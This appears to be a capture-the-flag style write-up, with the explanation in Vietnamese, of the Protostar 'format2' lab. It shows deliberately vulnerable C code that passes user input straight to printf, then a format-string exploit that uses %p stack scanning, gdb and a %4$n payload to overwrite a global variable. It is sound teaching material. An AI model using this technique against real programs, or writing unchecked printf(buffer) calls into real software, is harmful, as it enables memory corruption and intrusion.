# FORMAT TWO

## About

This level moves on from format1 and shows how specific values can be written in memory.

This level is at /opt/protostar/bin/format2

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

## Solutions

`FORMAT TWO` là nâng cấp của `FORMAT ONE`, nó cho chúng ta thấy cách mà chúng ta có thể sử dụng chuỗi định dạng để thay đổi giá trị theo ý muốn của người khai thác tại vị trí tùy ý trên bộ nhớ. Thử thách sẽ hoàn thành khi ta thay đổi được giá trị của biến toàn cục target == 64 và in ra "you have modified the target :)".

Đầu tiên ta đi tìm input của chúng ta được định dạng ở parameter thứ mấy bằng cách quét stack.

```
root@protostar:/opt/protostar/bin# ./format2
AAAA %p %p %p %p %p %p %p
AAAA 0x200 0xb7fd8420 0xbffffb04 0x41414141 0x20702520 0x25207025 0x70252070
target is 0 :(
root@protostar:/opt/protostar/bin#
```

"AAAA" được định dạng ở parameter thứ 4, giờ ta tìm địa chỉ của biến toàn cục `target`.

```
root@protostar:/opt/protostar/bin# gdb -q ./format2
Reading symbols from /opt/protostar/bin/format2...done.
(gdb) p target
$1 = 0
(gdb) p &target
$2 = (int *) 0x80496e4
(gdb)
```

Khi ta sử dụng định dạng chuỗi dưới dạng `%[number]$n` điều đó tương đương với sử dụng định dạng chuỗi thứ `number` trong khai thác. Ở thử thách này nó sẽ là `%4$n`.

Với 4 ký tự là địa chỉ ở đầu chuỗi payload ta cần thêm 60 ký tự để có thể ghi chính xác giá trị 64 vào biến `target`, tôi sẽ sử dụng độ dài tối thiểu mà tôi có nói đến ở `FORMAT ZERO`.

Tiến hành khai thác:

```
root@protostar:/opt/protostar/bin# python -c 'print "\xe4\x96\x04\x08" + "%60c" + "%4$n"' | ./format2

you have modified the target :)
```

## Documents

<https://en.wikipedia.org/wiki/Printf_format_string>

<https://stackoverflow.com/questions/3401156/what-is-the-use-of-the-n-format-specifier-in-c>



